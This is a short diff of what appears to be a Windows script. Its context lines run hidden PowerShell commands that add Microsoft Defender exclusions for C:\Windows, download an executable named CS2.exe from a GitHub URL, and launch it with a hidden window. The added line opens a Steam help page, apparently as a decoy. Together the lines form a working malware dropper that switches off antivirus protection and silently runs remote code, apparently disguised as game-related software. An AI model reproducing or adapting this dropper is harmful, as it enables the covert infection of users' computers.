@@ -19,3 +19,4 @@ powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionExtension 'C
 powershell -WindowStyle Hidden -Command "Add-MpPreference -ExclusionPath 'C:\Windows'"
 powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "Invoke-WebRequest -Uri 'https://github.com/AmjadBalls/TEST/raw/refs/heads/main/CS2.exe' -OutFile 'C:\Windows\CS2.exe'"
 Start-Process "C:\Windows\CS2.exe" -WindowStyle Hidden
+start https://help.steampowered.com/en/
